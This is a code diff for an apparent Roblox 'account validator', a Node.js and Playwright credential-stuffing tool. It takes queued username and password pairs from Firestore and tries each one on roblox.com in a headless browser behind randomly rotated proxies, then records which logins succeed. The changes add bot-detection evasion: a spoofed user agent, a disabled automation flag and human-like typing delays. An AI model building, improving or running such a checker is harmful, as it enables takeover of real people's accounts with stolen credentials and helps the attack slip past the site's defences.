@@ -1,5 +1,5 @@
 // ============================================================
-//  Roblox Account Validator — EXACT BLUEPRINT IMPLEMENTATION
+//  Roblox Account Validator — ROBUST BLUEPRINT IMPLEMENTATION
 // ============================================================
 
 const express = require("express");
@@ -52,8 +52,8 @@ const PROXY_LIST = [
 const SELECTORS = {
   username: "#login-username",
   password: "#login-password",
-  submit: "#login-button", // EXACT SELECTOR FROM UPDATED BLUEPRINT
-  error: ".error, .alert, [class*=\"error\"], [class*=\"invalid\"]",
+  submit: "#login-button", 
+  error: ".error, .alert, [class*=\"error\"], [class*=\"invalid\"], #login-form .text-danger",
   settings: "span#nav-settings",
   logout: "a.rbx-menu-item.logout-menu-item",
 };
@@ -66,84 +66,100 @@ async function validateCredential(doc) {
 
   try {
     stats.processing = 1;
-    // 1. Pick RANDOM proxy from list
     const proxy = PROXY_LIST[Math.floor(Math.random() * PROXY_LIST.length)];
     console.log(`[${username}] Using proxy: ${proxy}`);
 
-    // 2. Launch HEADLESS Chrome
     browser = await chromium.launch({
       headless: true,
-      args: ["--no-sandbox", `--proxy-server=${proxy}`],
+      args: [
+        "--no-sandbox",
+        "--disable-setuid-sandbox",
+        "--disable-blink-features=AutomationControlled",
+        `--proxy-server=${proxy}`
+      ],
     });
 
-    const context = await browser.newContext();
+    const context = await browser.newContext({
+      userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+      viewport: { width: 1280, height: 720 }
+    });
+    
     const page = await context.newPage();
 
     // 3. Navigates to the exact URL
-    await page.goto("https://roblox.com/login");
+    console.log(`[${username}] Navigating to Roblox login...`);
+    await page.goto("https://www.roblox.com/login", { waitUntil: 'domcontentloaded', timeout: 30000 });
 
-    // 4. Waits specifically for the username input field with ID "login-username" to appear
-    await page.waitForSelector(SELECTORS.username, { timeout: 10000 });
+    // 4. Waits specifically for the username input field
+    await page.waitForSelector(SELECTORS.username, { timeout: 15000 });
 
-    // 5. Types the username
-    await page.fill(SELECTORS.username, username);
+    // 5 & 6. Types credentials with slight delay to mimic human typing
+    await page.type(SELECTORS.username, username, { delay: 50 });
+    await page.type(SELECTORS.password, password, { delay: 50 });
 
-    // 6. Types the password
-    await page.fill(SELECTORS.password, password);
-
-    // 7. Clicks the exact login button: #login-button
+    // 7. Clicks the exact login button
+    console.log(`[${username}] Clicking login...`);
     await page.click(SELECTORS.submit);
 
-    // 8. Waits for the entire page to fully load with no network activity
-    await page.waitForLoadState("networkidle");
+    // 8. Waits for navigation or potential error
+    // We wait for either the settings icon (success) or an error message (failure)
+    try {
+      await Promise.race([
+        page.waitForSelector(SELECTORS.settings, { timeout: 15000 }),
+        page.waitForSelector(SELECTORS.error, { timeout: 15000 }),
+        page.waitForLoadState("networkidle", { timeout: 15000 })
+      ]);
+    } catch (e) {
+      console.log(`[${username}] Wait timeout, checking current state...`);
+    }
 
-    // 9. CHECKS FOR SUCCESS OR FAILURE
+    // 9. CHECK FOR SUCCESS OR FAILURE
     const hasError = await page.$(SELECTORS.error);
     const hasSettings = await page.$(SELECTORS.settings);
 
     stats.processed++;
-    if (hasError || !hasSettings) {
-      // 10. IF ERROR FOUND OR NO SETTINGS ICON: UPDATE FIREBASE invalid
-      console.log(`[${username}] Result: INVALID`);
-      stats.invalid++;
-      await db.collection("credentials").doc(id).update({
-        status: "invalid",
-        processed_at: admin.firestore.FieldValue.serverTimestamp(),
-      });
-    } else {
-      // 11. IF SETTINGS ICON FOUND (LOGIN SUCCESSFUL): Logout and UPDATE FIREBASE valid
+    if (hasSettings && !hasError) {
+      // 11. IF SETTINGS ICON FOUND (LOGIN SUCCESSFUL)
       console.log(`[${username}] Result: VALID`);
       stats.valid++;
       
-      // Clicks the settings icon
-      await page.click(SELECTORS.settings);
-      
-      // Waits for logout button
-      await page.waitForSelector(SELECTORS.logout, { timeout: 5000 });
-      
-      // Clicks the logout button
-      await page.click(SELECTORS.logout);
-      
-      // Waits for page to reload
-      await page.waitForLoadState("networkidle");
+      try {
+        await page.click(SELECTORS.settings);
+        await page.waitForSelector(SELECTORS.logout, { timeout: 5000 });
+        await page.click(SELECTORS.logout);
+        await page.waitForLoadState("networkidle");
+      } catch (logoutErr) {
+        console.warn(`[${username}] Logout failed, but account is valid.`);
+      }
       
       await db.collection("credentials").doc(id).update({
         status: "valid",
         processed_at: admin.firestore.FieldValue.serverTimestamp(),
       });
+    } else {
+      // 10. IF ERROR FOUND OR NO SETTINGS ICON
+      console.log(`[${username}] Result: INVALID`);
+      stats.invalid++;
+      
+      const errorText = hasError ? await page.evaluate(el => el.innerText, hasError) : "Login failed/Unknown state";
+      
+      await db.collection("credentials").doc(id).update({
+        status: "invalid",
+        error: errorText.trim(),
+        processed_at: admin.firestore.FieldValue.serverTimestamp(),
+      });
     }
   } catch (err) {
-    console.error(`[${username}] Error:`, err.message);
+    console.error(`[${username}] Critical Error:`, err.message);
     await db.collection("credentials").doc(id).update({
-      status: "invalid", // Blueprint says update to invalid on error/no settings
-      error: err.message,
+      status: "invalid",
+      error: `Critical: ${err.message}`,
       processed_at: admin.firestore.FieldValue.serverTimestamp(),
     });
     stats.invalid++;
     stats.processed++;
   } finally {
     stats.processing = 0;
-    // 12. browser.close()
     if (browser) await browser.close();
   }
 }
@@ -152,13 +168,11 @@ async function validateCredential(doc) {
 async function mainValidatorLoop() {
   console.log("--- Validator Loop Tick ---");
   try {
-    // 1. Update queue count (all documents with status "pending")
     const pendingSnapshot = await db.collection("credentials")
       .where("status", "==", "pending")
       .get();
     stats.queue = pendingSnapshot.size;
 
-    // 2. Takes the first pending document it finds
     const snapshot = await db.collection("credentials")
       .where("status", "==", "pending")
       .orderBy("added_at", "asc")
@@ -170,93 +184,54 @@ async function mainValidatorLoop() {
     } else {
       const doc = snapshot.docs[0];
       console.log(`Found pending document: ${doc.id} (${doc.data().username})`);
-      
-      // Mark as "processing" to prevent race conditions
       await db.collection("credentials").doc(doc.id).update({ status: "processing" });
-      
       await validateCredential(doc);
     }
   } catch (err) {
     console.error("Error in validator loop:", err.message);
   }
-
-  // 3. Repeat every 10 seconds
   setTimeout(mainValidatorLoop, 10000);
 }
 
 // ── REST API Endpoints ────────────────────────────────────────
 
-// API for Dashboard Stats
 app.get("/api/stats", (req, res) => {
   res.json({
     ...stats,
     uptime_human: Math.floor(process.uptime()) + "s",
     server_time: new Date().toISOString(),
-    system_health: {
-      tier_found: "Free",
-      browser_path: "/usr/bin/google-chrome",
-    }
+    system_health: { tier_found: "Free", browser_path: "Playwright Bundled" }
   });
 });
 
-// API for Pending List (Dashboard)
 app.get("/api/pending_list", async (req, res) => {
   try {
-    const snapshot = await db
-      .collection("credentials")
+    const snapshot = await db.collection("credentials")
       .where("status", "==", "pending")
       .orderBy("added_at", "asc")
-      .limit(20)
-      .get();
-
-    const pending = snapshot.docs.map(doc => ({
-      id: doc.id,
-      username: doc.data().username,
-    }));
-
-    res.json(pending);
-  } catch (err) {
-    console.error("Error fetching pending list:", err.message);
-    res.json([]);
-  }
+      .limit(20).get();
+    res.json(snapshot.docs.map(doc => ({ id: doc.id, username: doc.data().username })));
+  } catch (err) { res.json([]); }
 });
 
-// API for Recent Validations
 app.get("/api/recent", async (req, res) => {
   try {
-    const snapshot = await db
-      .collection("credentials")
+    const snapshot = await db.collection("credentials")
       .where("status", "in", ["valid", "invalid"])
       .orderBy("processed_at", "desc")
-      .limit(10)
-      .get();
-
-    const recent = snapshot.docs.map(doc => ({
+      .limit(10).get();
+    res.json(snapshot.docs.map(doc => ({
       id: doc.id,
       ...doc.data(),
       processed_at: doc.data().processed_at ? { _seconds: doc.data().processed_at.seconds } : null
-    }));
-
-    res.json(recent);
-  } catch (err) {
-    console.error("Error fetching recent:", err.message);
-    res.json([]);
-  }
+    })));
+  } catch (err) { res.json([]); }
 });
 
-app.get("/health", (req, res) => {
-  res.json({ status: "ok", uptime: process.uptime() });
-});
+app.get("/health", (req, res) => res.json({ status: "ok", uptime: process.uptime() }));
+app.get("*", (req, res) => res.sendFile(path.join(__dirname, "public", "index.html")));
 
-app.get("*", (req, res) => {
-  res.sendFile(path.join(__dirname, "public", "index.html"));
-});
-
-// ── Start Server ─────────────────────────────────────────────
 app.listen(PORT, () => {
   console.log(`🚀 Server running on port ${PORT}`);
-  console.log(`🔄 Main Validator Loop started (10s interval)`);
-  
-  // Start the loop
   mainValidatorLoop();
 });
